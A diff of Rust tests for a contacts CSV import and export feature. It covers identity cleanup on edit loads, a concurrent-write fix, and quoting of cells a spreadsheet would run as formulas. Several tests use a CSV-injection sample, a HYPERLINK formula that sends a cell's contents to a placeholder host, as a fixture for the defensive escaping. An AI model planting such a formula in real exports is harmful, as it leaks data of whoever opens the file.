@@ -58,6 +58,33 @@ async fn imported(
     id
 }
 
+/// Make `raw`, already an identity, the one other person in a one-to-one
+/// conversation, so something cites it.
+async fn in_a_conversation(conn: &mut SqliteConnection, raw: &str) {
+    let handle_id: i64 =
+        sqlx::query_scalar("SELECT id FROM handles WHERE account_id = $1 AND raw = $2")
+            .bind(ACCOUNT)
+            .bind(raw)
+            .fetch_one(&mut *conn)
+            .await
+            .unwrap();
+    let conversation: i64 = sqlx::query_scalar(
+        "INSERT INTO conversations (account_id, chat_handle_id, conversation_type, source_file)
+         VALUES ($1, $2, 'individual', 'c.jsonl') RETURNING id",
+    )
+    .bind(ACCOUNT)
+    .bind(handle_id)
+    .fetch_one(&mut *conn)
+    .await
+    .unwrap();
+    sqlx::query("INSERT INTO participants (conversation_id, handle_id) VALUES ($1, $2)")
+        .bind(conversation)
+        .bind(handle_id)
+        .execute(&mut *conn)
+        .await
+        .unwrap();
+}
+
 /// Put a contact in a Contact Group, creating the group.
 async fn join_group(conn: &mut SqliteConnection, contact_id: i64, group: &str) {
     named_membership::set_membership(
@@ -702,6 +729,7 @@ async fn edit_removes_the_identities_and_memberships_the_rows_do_not_list() {
     )
     .await;
     join_group(&mut conn, ada, "Family").await;
+    in_a_conversation(&mut conn, "+15555550109").await;
     let text = file(&[
         &format!("{ada},Ada,Work,phone,phone,+15555550100"),
         &format!("{ada},Ada,Work,phone,email,ada@example.com"),
@@ -722,16 +750,20 @@ async fn edit_removes_the_identities_and_memberships_the_rows_do_not_list() {
         ["phone/email/ada@example.com", "phone/phone/+15555550100"]
     );
     assert_eq!(groups_of(&mut conn, ada).await, ["Work"]);
-    // The identity is off the contact and still in the database: an import
-    // made it, and its conversations cite it.
-    let still_there: i64 = sqlx::query_scalar(
-        "SELECT COUNT(*) FROM handles WHERE account_id = $1 AND normalized = '+15555550109'",
+    // The identity is off the contact and, because a conversation cites it,
+    // on a new contact with no name: the person is Unknown for it again.
+    let holder: Vec<String> = sqlx::query_scalar(
+        "SELECT ct.preferred_name FROM handles h
+         JOIN contact_handles ch ON ch.handle_id = h.id
+         JOIN contacts ct ON ct.id = ch.contact_id
+         WHERE h.account_id = $1 AND h.normalized = '+15555550109'",
     )
     .bind(ACCOUNT)
-    .fetch_one(&mut *conn)
+    .fetch_all(&mut *conn)
     .await
     .unwrap();
-    assert_eq!(still_there, 1);
+    assert_eq!(holder, [String::new()]);
+    crate::test_support::assert_every_person_is_on_a_contact(&mut conn, "an Edit load").await;
     // The Contact Group it left is not deleted either.
     let family: i64 =
         sqlx::query_scalar("SELECT COUNT(*) FROM contact_groups WHERE name = 'Family'")
@@ -739,6 +771,33 @@ async fn edit_removes_the_identities_and_memberships_the_rows_do_not_list() {
             .await
             .unwrap();
     assert_eq!(family, 1);
+}
+
+/// An identity Edit takes off a contact that nothing else uses is deleted,
+/// because on no contact it would appear in no list.
+#[tokio::test]
+async fn edit_deletes_an_unlisted_identity_nothing_uses() {
+    let (mut conn, _pool, _dir) = account().await;
+    let ada = imported(
+        &mut conn,
+        "Ada",
+        &[
+            ("phone", "phone", "+15555550100"),
+            ("phone", "phone", "+15555550109"),
+        ],
+    )
+    .await;
+    let text = file(&[&format!("{ada},Ada,,phone,phone,+15555550100")]);
+    let counts = loaded(&mut conn, &text, LoadMode::Edit).await;
+    assert_eq!(counts.identities_removed, 1);
+    let left: i64 = sqlx::query_scalar(
+        "SELECT COUNT(*) FROM handles WHERE account_id = $1 AND normalized = '+15555550109'",
+    )
+    .bind(ACCOUNT)
+    .fetch_one(&mut *conn)
+    .await
+    .unwrap();
+    assert_eq!(left, 0);
 }
 
 /// A group name is matched to a Contact Group ignoring case, and one that
@@ -1044,10 +1103,10 @@ async fn export_writes_one_row_per_identity_with_the_contact_repeated() {
         text,
         format!(
             "{HEADER}\n\
-             {unknown},,,phone,phone,+15555550101\n\
+             {unknown},,,phone,phone,'+15555550101\n\
              {ada},Ada,Family;Work,phone,email,ada@example.com\n\
-             {ada},Ada,Family;Work,phone,phone,+15555550100\n\
-             {ada},Ada,Family;Work,whatsapp,phone,+15555550100\n\
+             {ada},Ada,Family;Work,phone,phone,'+15555550100\n\
+             {ada},Ada,Family;Work,whatsapp,phone,'+15555550100\n\
              {no_identity},Cy,,,,\n"
         )
     );
@@ -1056,7 +1115,7 @@ async fn export_writes_one_row_per_identity_with_the_contact_repeated() {
     let text = export_csv(&mut conn, ACCOUNT, Some(&only)).await.unwrap();
     assert_eq!(
         text,
-        format!("{HEADER}\n{unknown},,,phone,phone,+15555550101\n")
+        format!("{HEADER}\n{unknown},,,phone,phone,'+15555550101\n")
     );
 }
 
@@ -1278,4 +1337,192 @@ async fn a_us_number_without_plus_still_loads_as_its_plus_one_identity() {
         identities_of(&mut conn, ada).await,
         ["phone/phone/+15555550100"]
     );
+}
+
+// --- Cells a spreadsheet would read as a formula ---
+
+/// A spreadsheet runs a cell that starts with `=`, `+`, `-`, `@`, a tab or
+/// a carriage return as a formula, so Export writes a `'` before each such
+/// cell in every column, and a spreadsheet shows the cell as text.
+#[tokio::test]
+async fn export_writes_a_quote_before_a_cell_a_spreadsheet_would_run() {
+    let (mut conn, _pool, _dir) = account().await;
+    let name = "=HYPERLINK(\"http://example.com/?\"&B2,\"Ada\")";
+    let ada = imported(
+        &mut conn,
+        name,
+        &[
+            ("phone", "phone", "+15555550100"),
+            ("phone", "username", "@ada"),
+            ("phone", "other", "-ada"),
+        ],
+    )
+    .await;
+    join_group(&mut conn, ada, "+Work").await;
+
+    let text = export_csv(&mut conn, ACCOUNT, None).await.unwrap();
+    let cell = "\"'=HYPERLINK(\"\"http://example.com/?\"\"&B2,\"\"Ada\"\")\"";
+    assert_eq!(
+        text,
+        format!(
+            "{HEADER}\n\
+             {ada},{cell},'+Work,phone,other,'-ada\n\
+             {ada},{cell},'+Work,phone,phone,'+15555550100\n\
+             {ada},{cell},'+Work,phone,username,'@ada\n"
+        )
+    );
+}
+
+/// The `'` Export writes is taken off again, so the file loaded straight
+/// back changes nothing. A name that itself starts with `'` and then one of
+/// those characters gets a second `'`, so it comes back with its own.
+#[tokio::test]
+async fn a_quoted_cell_loaded_straight_back_changes_nothing() {
+    let (mut conn, _pool, _dir) = account().await;
+    let ada = imported(
+        &mut conn,
+        "=HYPERLINK(\"http://example.com/?\"&B2,\"Ada\")",
+        &[("phone", "phone", "+15555550100")],
+    )
+    .await;
+    join_group(&mut conn, ada, "-Family").await;
+    imported(&mut conn, "'=1+1", &[("phone", "username", "@bo")]).await;
+    let stamp = "2001-01-01 00:00:00";
+    sqlx::query("UPDATE contacts SET last_modified = $1")
+        .bind(stamp)
+        .execute(&mut *conn)
+        .await
+        .unwrap();
+
+    let before = picture(&mut conn).await;
+    let text = export_csv(&mut conn, ACCOUNT, None).await.unwrap();
+    for mode in [LoadMode::Append, LoadMode::Edit] {
+        let counts = loaded(&mut conn, &text, mode).await;
+        assert_eq!(counts, LoadCounts::default(), "{mode:?}");
+        assert_eq!(picture(&mut conn).await, before, "{mode:?}");
+        assert_eq!(
+            export_csv(&mut conn, ACCOUNT, None).await.unwrap(),
+            text,
+            "{mode:?}"
+        );
+    }
+}
+
+/// A spreadsheet may keep the `'` when it saves or drop it. The load reads
+/// the cell the same either way.
+#[tokio::test]
+async fn a_cell_loads_the_same_with_or_without_its_quote() {
+    let (mut conn, _pool, _dir) = account().await;
+    let counts = loaded(
+        &mut conn,
+        &file(&[
+            ",'=Ada,'+Work,phone,phone,'+15555550100",
+            ",=Bo,+Work,phone,phone,+15555550101",
+        ]),
+        LoadMode::Append,
+    )
+    .await;
+    assert_eq!(counts.contacts_created, 2);
+    let ada = contact_named(&mut conn, "=Ada").await;
+    assert_eq!(
+        identities_of(&mut conn, ada).await,
+        ["phone/phone/+15555550100"]
+    );
+    assert_eq!(groups_of(&mut conn, ada).await, ["+Work"]);
+    let bo = contact_named(&mut conn, "=Bo").await;
+    assert_eq!(groups_of(&mut conn, bo).await, ["+Work"]);
+}
+
+/// Only one `'`, and only before one of those characters, is taken off: a
+/// name that starts with `'` for its own sake keeps it.
+#[tokio::test]
+async fn a_quote_before_other_text_is_part_of_the_cell() {
+    let (mut conn, _pool, _dir) = account().await;
+    loaded(
+        &mut conn,
+        &file(&[
+            ",'Twas,,phone,phone,+15555550100",
+            ",''=Cy,,phone,phone,+15555550101",
+        ]),
+        LoadMode::Append,
+    )
+    .await;
+    contact_named(&mut conn, "'Twas").await;
+    contact_named(&mut conn, "'=Cy").await;
+}
+
+/// Every character a spreadsheet reads as the start of a formula gets the
+/// `'`, and the load takes exactly that `'` off again.
+#[test]
+fn every_formula_start_is_quoted_and_read_back() {
+    for cell in ["=1", "+1", "-1", "@a", "\ta", "\ra", "'=1", "''+1"] {
+        let written = written_cell(cell);
+        assert_eq!(written, format!("'{cell}"), "{cell:?}");
+        assert_eq!(read_cell(&written), cell, "{cell:?}");
+    }
+    for cell in ["", "Ada", "'Twas", "a=1", "15555550100"] {
+        assert_eq!(written_cell(cell), cell, "{cell:?}");
+        assert_eq!(read_cell(cell), cell, "{cell:?}");
+    }
+}
+
+/// LibreOffice Calc 26.2 opens the export with every `'` shown in its cell,
+/// and saves it back with every text cell in double quotes and the `'`
+/// kept. That file loads back without a change.
+#[tokio::test]
+async fn an_export_libreoffice_saved_again_changes_nothing() {
+    let (mut conn, _pool, _dir) = account().await;
+    let ada = imported(
+        &mut conn,
+        "=HYPERLINK(\"http://example.com/?\"&B2,\"Ada\")",
+        &[
+            ("phone", "phone", "+15555550100"),
+            ("phone", "username", "@ada"),
+        ],
+    )
+    .await;
+    join_group(&mut conn, ada, "+Work").await;
+    let before = picture(&mut conn).await;
+    let text = export_csv(&mut conn, ACCOUNT, None).await.unwrap();
+
+    let mut reader = csv::Reader::from_reader(text.as_bytes());
+    let mut writer = csv::WriterBuilder::new()
+        .quote_style(csv::QuoteStyle::NonNumeric)
+        .from_writer(Vec::new());
+    writer.write_record(reader.headers().unwrap()).unwrap();
+    for record in reader.records() {
+        writer.write_record(&record.unwrap()).unwrap();
+    }
+    let saved = String::from_utf8(writer.into_inner().unwrap()).unwrap();
+    assert!(saved.contains(&format!("{ada},\"'=HYPERLINK(")), "{saved}");
+    assert!(saved.contains(",\"'+15555550100\""), "{saved}");
+
+    for mode in [LoadMode::Append, LoadMode::Edit] {
+        let counts = loaded(&mut conn, &saved, mode).await;
+        assert_eq!(counts, LoadCounts::default(), "{mode:?}");
+        assert_eq!(picture(&mut conn).await, before, "{mode:?}");
+    }
+}
+
+// --- Another write at the same time ---
+
+/// An import that commits while a load reads the account's contacts made the
+/// load's first write fail with `SQLITE_BUSY_SNAPSHOT`, and the load answered
+/// `500`. The load waits for the other write instead and then runs.
+#[tokio::test]
+async fn a_write_that_commits_while_the_load_reads_does_not_fail_it() {
+    let (mut conn, pool, _dir) = account().await;
+    let mut other_conn = pool.acquire().await.unwrap();
+    let mut other = crate::db::begin_write(&mut other_conn).await.unwrap();
+    crate::db::account_profile::ensure_account_row(&mut other, ACCOUNT + 1)
+        .await
+        .unwrap();
+    let text = file(&["ada,Ada,Family,phone,phone,+15555550100"]);
+    let counts = crate::db::write_tx::commit_during(
+        other,
+        load(&mut conn, ACCOUNT, &text, LoadMode::Append),
+    )
+    .await
+    .unwrap_or_else(|e| panic!("load failed: {e}"));
+    assert_eq!(counts.contacts_created, 1);
 }
